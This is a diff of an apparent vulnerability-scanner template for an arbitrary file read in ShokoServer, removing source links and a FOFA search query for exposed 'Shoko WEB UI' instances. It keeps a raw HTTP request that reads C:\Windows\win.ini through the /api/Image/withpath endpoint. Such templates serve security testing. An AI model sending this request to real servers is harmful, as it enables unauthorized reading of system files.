@@ -3,14 +3,8 @@ info:
   name: ShokoServerwithpath存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0eae4bdeb62d9a31e52e5a31b4d6f759
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0eae4bdeb62d9a31e52e5a31b4d6f759
-    fofa: title="Shoko WEB UI"
 http:
 - raw:
   - 'GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1
